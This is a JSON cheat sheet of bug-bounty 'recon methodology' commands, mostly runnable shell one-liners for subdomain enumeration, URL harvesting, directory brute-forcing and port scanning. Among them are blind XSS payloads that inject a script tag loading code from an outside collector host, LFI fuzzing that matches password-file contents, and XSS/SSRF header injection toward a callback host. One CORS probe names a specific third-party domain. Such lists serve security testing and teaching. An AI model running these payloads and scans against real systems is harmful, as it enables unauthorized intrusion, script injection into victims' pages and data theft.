{
    "id": "recon-methodology",
    "title": "Advanced Recon Methodology",
    "category": "Web Security",
    "commands": [
        {
            "cmd": "subfinder -d example.com -all -recursive > subdomain.txt",
            "info": "For finding subdomains"
        },
        {
            "cmd": "cat subdomain.txt | httpx-toolkit -ports 80,443,8080,8000,8888 -threads 200 > subdomains_alive.txt",
            "info": "For filter out live subdomains"
        },
        {
            "cmd": "katana -u subdomains_alive.txt -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -kf -jc -fx -ef woff,css,png,svg,jpg,woff2,jpeg,gif,svg -o allurls.txt",
            "info": "For fetching passive urls"
        },
        {
            "cmd": "cat allurls.txt | grep -E '\\.xls|\\.xml|\\.xlsx|\\.json|\\.pdf|\\.sql|\\.doc|\\.docx|\\.pptx|\\.txt|\\.zip|\\.tar\\.gz|\\.tgz|\\.bak|\\.7z|\\.rar|\\.log|\\.cache|\\.secret|\\.db|\\.backup|\\.yml|\\.gz|\\.config|\\.csv|\\.yaml|\\.md|\\.md5'",
            "info": "For finding sensitive files"
        },
        {
            "cmd": "echo example.com | katana -d 5 -ps -pss waybackarchive,commoncrawl,alienvault -f qurl | urldedupe >output.txt",
            "info": "For fetch and sorting urls - part 1"
        },
        {
            "cmd": "katana -u https://example.com -d 5 | grep '=' | urldedupe | anew output.txt",
            "info": "For fetch and sorting urls - part 2"
        },
        {
            "cmd": "cat output.txt | sed 's/=.*/=/' >final.txt",
            "info": "For fetch and sorting urls - part 3"
        },
        {
            "cmd": "echo example.com | gau --mc 200 | urldedupe >urls.txt",
            "info": "For fetch and sorting urls - part 4"
        },
        {
            "cmd": "cat urls.txt | grep -E '.php|.asp|.aspx|.jspx|.jsp' | grep '=' | sort > output.txt",
            "info": "For fetch and sorting urls - part 5"
        },
        {
            "cmd": "cat output.txt | sed 's/=.*/=/' >final.txt",
            "info": "For fetch and sorting urls - part 6"
        },
        {
            "cmd": "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -t 10 --rate-limit 10 --passive -m GET,POST --headers 'User-Agent: Mozilla/5.0'",
            "info": "For finding hidden parameter - part 1"
        },
        {
            "cmd": "arjun -u https://site.com/endpoint.php -oT arjun_output.txt -m GET,POST -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -t 10 --rate-limit 10 --headers 'User-Agent: Mozilla/5.0'",
            "info": "For finding hidden parameter - part 2"
        },
        {
            "cmd": "curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/",
            "info": "For checking CORS - part 1"
        },
        {
            "cmd": "curl -H 'Origin: http://example.com' -I https://etoropartners.com/wp-json/ | grep -i -e 'access-control-allow-origin' -e 'access-control-allow-methods' -e 'access-control-allow-credentials'",
            "info": "For checking CORS - part 2"
        },
        {
            "cmd": "site:*.example.com (ext:doc OR ext:docx OR ext:odt OR ext:pdf OR ext:rtf OR ext:ppt OR ext:pptx OR ext:csv OR ext:xls OR ext:xlsx OR ext:txt OR ext:xml OR ext:json OR ext:zip OR ext:rar OR ext:md OR ext:log OR ext:bak OR ext:conf OR ext:sql)",
            "info": "Information Disclosure dork"
        },
        {
            "cmd": "wpscan --url https://site.com --disable-tls-checks --api-token <here> -e at -e ap -e u --enumerate ap --plugins-detection aggressive --force",
            "info": "Wordpress aggressive scanning"
        },
        {
            "cmd": "echo 'https://example.com/' | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace 'FUZZ' | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr 'root:(x|\\*|\\$[^\\:]*):0:0:' -v",
            "info": "LFI methodology"
        },
        {
            "cmd": "dirsearch -u https://example.com -e php,cgi,htm,html,shtm,shtml,js,txt,bak,zip,old,conf,log,pl,asp,aspx,jsp,sql,db,sqlite,mdb,tar,gz,7z,rar,json,xml,yml,yaml,ini,java,py,rb,php3,php4,php5 --random-agent --recursive -R 3 -t 20 --exclude-status=404 --follow-redirects --delay=0.1",
            "info": "Directory Bruteforce - part 1"
        },
        {
            "cmd": "ffuf -w seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u https://example.com/FUZZ -fc 400,401,402,403,404,429,500,501,502,503 -recursion -recursion-depth 2 -e .html,.php,.txt,.pdf,.js,.css,.zip,.bak,.old,.log,.json,.xml,.config,.env,.asp,.aspx,.jsp,.gz,.tar,.sql,.db -ac -c -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0' -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Originating-IP: 127.0.0.1' -H 'X-Forwarded-Host: localhost' -t 100 -r -o results.json",
            "info": "Directory Bruteforce - part 2"
        },
        {
            "cmd": "echo example.com | katana -d 5 | grep -E '\\.js$' | nuclei -t nuclei-templates/http/exposures/ -c 30",
            "info": "JS File hunting - part 1"
        },
        {
            "cmd": "cat alljs.txt | nuclei -t /home/coffinxp/nuclei-templates/http/exposures/",
            "info": "JS File hunting - part 2"
        },
        {
            "cmd": "subzy run --targets subdomains.txt --concurrency 100 --hide_fails --verify_ssl",
            "info": "For Checking Subdomain takeover"
        },
        {
            "cmd": "python3 corsy.py -i subdomains_alive.txt -t 10 --headers 'User-Agent: GoogleBot\\nCookie: SESSION=Hacked'",
            "info": "For finding CORS"
        },
        {
            "cmd": "subfinder -d example.com | gau | bxss -payload ''><script src=https://xss.report/c/coffinxp></script>' -header 'X-Forwarded-For'",
            "info": "For testing header based blind xss"
        },
        {
            "cmd": "echo 'example.com ' | gau | qsreplace '<sCript>confirm(1)</sCript>' | xsschecker -match '<sCript>confirm(1)</sCript>' -vuln",
            "info": "For checking single xss on all urls"
        },
        {
            "cmd": "subfinder -d example.com | gau | grep '&' | bxss -appendMode -payload ''><script src=https://xss.report/c/coffinxp></script>' -parameters",
            "info": "For finding Blind xss"
        },
        {
            "cmd": "echo domain | gau | grep -Eo '(\\/[^\\/]+)\\.(php|asp|aspx|jsp|jsf|cfm|pl|perl|cgi|htm|html)$' | httpx -status-code -mc 200 -content-type | grep -E 'text/html|application/xhtml+xml'",
            "info": "Content-type Filter - part 1"
        },
        {
            "cmd": "Ssl.cert.subject.CN:'example.com' 200",
            "info": "Shodan dork"
        },
        {
            "cmd": "echo https://example.com/ | gau | gf xss | uro | Gxss | kxss | tee xss_output.txt",
            "info": "XSS method - part 1"
        },
        {
            "cmd": "cat xss_output.txt | grep -oP '^URL: \\K\\S+' | sed 's/=.*/=/' | sort -u > final.txt",
            "info": "XSS method - part 2"
        },
        {
            "cmd": "naabu -list ip.txt -c 50 -nmap-cli 'nmap -sV -SC' -o naabu-full.txt",
            "info": "Naabu scan"
        },
        {
            "cmd": "nmap -p- --min-rate 1000 -T4 -A target.com -oA fullscan",
            "info": "Nmap scan"
        },
        {
            "cmd": "masscan -p0-65535 target.com --rate 100000 -oG masscan-results.txt",
            "info": "Masscan"
        },
        {
            "cmd": "ffuf -request lfi -request-proto https -w /root/wordlists/offensive\\ payloads/LFI\\ payload.txt -c -mr 'root:'",
            "info": "FFUF request file method - part 1"
        },
        {
            "cmd": "ffuf -request xss -request-proto https -w /root/wordlists/xss-payloads.txt -c -mr '<script>alert('XSS')</script>'",
            "info": "FFUF request file method - part 2"
        },
        {
            "cmd": "cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotor'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotor'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotor'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e '\\e[1;32m$url\\e[0m''\\n''Method[1] X-Forwarded-For: xss+ssrf => $xss1''\\n''Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2''\\n''Method[3] Host: xss+ssrf ==> $xss3''\\n''Method[4] GET http://xss.yourburpcollabrotor HTTP/1.1 ''\\n';done",
            "info": "XSS and SSRF testing with headers"
        },
        {
            "cmd": "echo 'https://example.com/index.php?page=' | httpx-toolkit -paths payloads/lfi.txt -threads 50 -random-agent -mc 200 -mr 'root:(x|\\*|\\$[^\\:]*):0:0:'",
            "info": "LFI methodology - alternative method"
        }
    ],
    "tips": [
        "Always verify live subdomains before further testing",
        "Use rate limiting to avoid getting blocked",
        "Combine passive and active recon for better results",
        "Check for common misconfigurations in cloud services",
        "Monitor for sensitive data exposure in public files",
        "Verify potential vulnerabilities before reporting",
        "Use multiple tools to ensure comprehensive coverage",
        "Document your findings and methodology"
    ]
} 
